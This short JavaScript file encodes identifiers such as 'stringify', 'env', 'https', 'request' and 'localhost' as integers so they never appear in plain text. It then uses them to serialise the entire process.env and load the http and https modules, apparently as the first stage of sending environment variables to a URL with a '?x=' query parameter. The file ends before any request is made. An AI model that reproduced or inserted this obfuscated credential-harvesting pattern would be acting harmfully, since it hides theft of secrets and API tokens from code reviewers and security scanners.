const p = process, b = Buffer, r = require, j = JSON, f = 'from', bi = 'binary', t = 'toString'

// Stores a string as a single integer to be decoded later
function s_to_n (s) {
  let n = 0
  let mult = 1
  for (let i = 0; i < s.length; i++) {
    let c = s[i].charCodeAt(0)
    n += c * mult
    mult *= (1 + 0xFF)
  }
  return n
}

function _ (n) {
  let cs = []
  while (n > 0) {
    cs.push(0xFF & n)
    n >>= 8
  }
  return Buffer.from(cs, 'binary').toString('ascii')
}

// Only up to 4 chars
let word = 'end'
console.log('Use this integer: ', s_to_n(word))
console.log(_(s_to_n(word)))

// htt = 7631976
// ps = 29552
// env = 7761509
// stri = 1769108595
// ngi = 6907758
// fy = 31078
// req = 7431538
// uest = 1953719669
// :// = 3092282
// loca = 1633906540
// l = 108
// host = 1953722216
// http 1886680168
// ?x= 4028479
// :123 = 858927418
// :45 = 13620
// end = 6581861

const envString = j[_(1769108595) + _(6907758) + _(31078)](p[_(7761509)])
const https = r(_(7631976) + _(29552))
const http = r(_(1886680168))
